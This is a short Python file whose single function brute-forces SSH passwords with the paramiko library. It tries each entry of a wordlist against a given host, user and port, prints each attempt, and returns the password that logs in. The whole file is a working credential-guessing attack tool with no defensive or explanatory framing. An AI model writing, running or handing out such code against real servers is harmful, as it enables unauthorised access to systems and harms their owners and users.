import paramiko, os, threading
from itertools import product
from wordlist import create_wordlist
from concurrent.futures import ThreadPoolExecutor


def brute_force_ssh(target, user, port, wordlist):
    """ Brute force SSH. The function loop on each password of the wordlist and try to connect to the SSH server. 
    If the connection is successful, the function return the password. 
    If the connection is not successful, the function continue to loop on the next password. 
    If the function loop on all the passwords of the wordlist and the connection is not successful, the function return "Password not found in the wordlist"""

    wordlists = create_wordlist(wordlist)


    for word in wordlists:

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.WarningPolicy)

        try:
            print("Trying: " + word)
            ssh.connect(target, port=port,
                        username=user,
                        password=word,
                        look_for_keys=False,
                        banner_timeout=1,
                        timeout=1)
            
            ssh.close()
            output = f"Password found : '{word}'"
            return output

        except:
            
            ssh.close()
            continue
    
    return "Password not found in the wordlist"
